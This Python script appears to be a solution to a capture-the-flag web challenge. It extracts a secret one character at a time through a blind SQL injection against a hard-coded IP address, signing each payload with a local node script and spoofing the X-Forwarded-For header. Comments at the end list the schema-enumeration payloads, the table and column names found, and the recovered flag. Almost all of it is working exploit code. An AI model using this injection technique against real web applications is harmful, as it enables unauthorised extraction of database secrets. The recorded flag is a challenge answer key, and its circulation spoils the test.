# -*- coding:utf-8 -*-
import requests
import string
import os

flag = ''
for num in range(1, 100):
    for i in string.printable:
        pay = "ad%'&&(if(ord(reverse(rpad((SELECT secvalue from ctf_key8),{},'a')))={},1,0))#".format(str(num), str(ord(i)))
        data = str(os.popen("node math.js \"{}\"".format(pay)).read()).split('\n')
        sig = data[0]
        time = data[1]

        url = "http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig={}&time={}".format(sig, time)
        header = {"X-Forwarded-For": "123.232.23.245"}
        data = {"id": "", "title": "", "date": "", "author": pay, "button": "search"}
        res = requests.post(url, data=data, headers=header)
        # print res.content
        # break
        if "admin" in res.content:
            flag += i
            print flag
            break

# database: ddctf
# payload: schema()
# tables: ctf_key8,message
# payload: SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=schema()
# columns: secvalue
# payload: SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x6374665f6b657938
# flag: DDCTF{IKIDLHNZMKFUDEQE}
# payload: SELECT secvalue from ctf_key8
# version: 5.1.73